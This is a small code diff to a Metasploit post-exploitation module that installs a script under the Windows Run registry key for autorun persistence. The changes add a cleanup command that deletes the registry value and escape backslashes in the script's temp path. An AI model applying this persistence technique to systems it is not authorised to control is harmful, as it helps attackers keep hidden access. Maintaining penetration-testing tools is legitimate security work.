@@ -136,6 +136,7 @@ class MetasploitModule < Msf::Post
     if key
       registry_setvaldata("#{key}\\Software\\Microsoft\\Windows\\CurrentVersion\\Run", nam, script_on_target, "REG_SZ")
       print_good("Installed into autorun as #{key}\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\#{nam}")
+      @clean_up_rc << "reg deleteval -k '#{key}\\Software\\Microsoft\\Windows\\CurrentVersion\\Run' -v '#{nam}'\n"
     else
       print_error("Error: failed to open the registry key for writing")
     end
@@ -190,6 +191,7 @@ class MetasploitModule < Msf::Post
     end
 
     print_good("Persistent Script written to #{temprexe}")
+    temprexe.gsub!("\\", "\\\\\\\\")
     @clean_up_rc << "rm #{temprexe}\n"
     temprexe
   end
